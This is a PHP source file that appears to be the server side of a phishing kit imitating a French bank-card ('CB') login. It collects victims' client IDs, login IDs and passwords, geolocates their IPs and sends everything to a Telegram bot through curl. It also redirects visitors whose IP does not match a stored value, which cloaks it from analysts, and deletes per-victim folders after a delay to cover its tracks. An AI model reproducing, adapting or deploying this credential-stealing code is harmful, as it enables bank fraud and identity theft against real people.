<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    // Check for shared internet connection
    $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    // Check for proxy connection
    $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    // Use remote address
    $ipAddress = $_SERVER['REMOTE_ADDR'];
}
$ipPortArray = explode(':', $ipAddress);
$StrupLom = $ipPortArray[0];
$donflag = $_SERVER['SERVER_NAME'];
    $info = unserialize(file_get_contents("http://ip-api.com/php/{$StrupLom}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"));
    if (isset($info['as'])) {
        $_SESSION['isp'] = $info['as'];
    }
    if (isset($info['country'])) {
        $_SESSION['Blasacoun'] = $info['country'];
    }
    if (isset($info['countryCode'])) {
        $_SESSION['Njopf'] = $info['countryCode'];
    }
    if (isset($info['city'])) {
        $_SESSION['Voprt'] = $info['city'];
    }
    if (isset($info['regionName'])) {
        $_SESSION['xOpuy'] = $info['regionName'];
    }
function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    $time_diff = time() - filectime($dir);
    if ($time_diff > 920) { // if the difference is greater than 4 minutes (240 seconds)
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
              
                return false;
            }
        }
        if (rmdir($dir)) {
          
            return true;
        } else {
          
            return false;
        }
    } else {
     
        return true;
    }
}

$parentDirectory = '../../web';
$directories = glob($parentDirectory.'/*', GLOB_ONLYDIR);

if(is_array($directories)) {
  
    foreach($directories as $dir) {
        if(basename($dir)[0] != '.') { 
            if(deleteDirectory($dir)) {
            
            }  
        }
    }
}
$filename = 'local.txt';
if (file_exists($filename)) {
    $myfile = fopen($filename, "r") or die("Unable to open file!");
    $reslocal = fread($myfile,filesize($filename));

fclose($myfile);
} 
else {
	$StrongSol = "" . basename(__DIR__);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='../../index.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "&lolme=$StrongSol';
    </script>");
    exit();
}



if (trim($reslocal) != trim($StrupLom))
    {
		
    $StrongSol = "" . basename(__DIR__);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='../../index.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "&lolme=$StrongSol';
    </script>");
     exit();	  

}

function telsent($message) {
    $TrubFtub = $_COOKIE['idtel'];
    $cRetVckr = $_COOKIE['tokentel'];
    $api_url = "https://api.telegram.org/bot{$cRetVckr}/sendMessage";
    $params = ["chat_id" => $TrubFtub, "text" => $message];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
}

$currentUrl = $_SERVER['REQUEST_URI']; // Get the current URL path
$parts = explode('/', $currentUrl); // Split the path by slashes

$index = array_search('web', $parts); // Find the index of 'web' in the path
$username = $parts[$index + 1]; // Get the directory name after 'web'

$cc2 = $username;
$cc4 = $_POST['client_pass'];

$cc3 = $_SESSION['logid'];
	   if(isset($_POST) ){

$data = array();	

if ($_POST['device'] == "" || $_POST['client_pass'] == "") {
 
 
 
$data['statut'] = 'error'; 
$data['title'] = 'echec';
$data['resultat']="Veuillez saisir tout les champs";
  
 

 }
  else
  {

$TIME_DATE = date('Y-m-d H:i:s');
$sysmsg = "
*** Project CB Login *** \n
[+][Client ID] = $cc2 \n
[+][Log] = $cc3 \n
[+][Pass] = $cc4 \n
-------------------------\n
[URL] = $donflag \n
[COUNTRY] = " .$_SESSION['Blasacoun']." \n
[Region] = ". $_SESSION['xOpuy']." \n
[ISP] = ".$_SESSION['isp']." \n
[IP]  = $StrupLom \n
[TIME/DATE]  = $TIME_DATE \n
*** By *Key ***\n";

       telsent($sysmsg);
$Page = ' ';
$fPage = fopen("../api.txt", "w");
$_SESSION['logid'] = $cc3;
fwrite($fPage, $Page);
$data['statut'] = 'success'; 
$data['title'] = 'succès'; 
$data['resultat']="valider";
}

echo json_encode($data);


}
?>
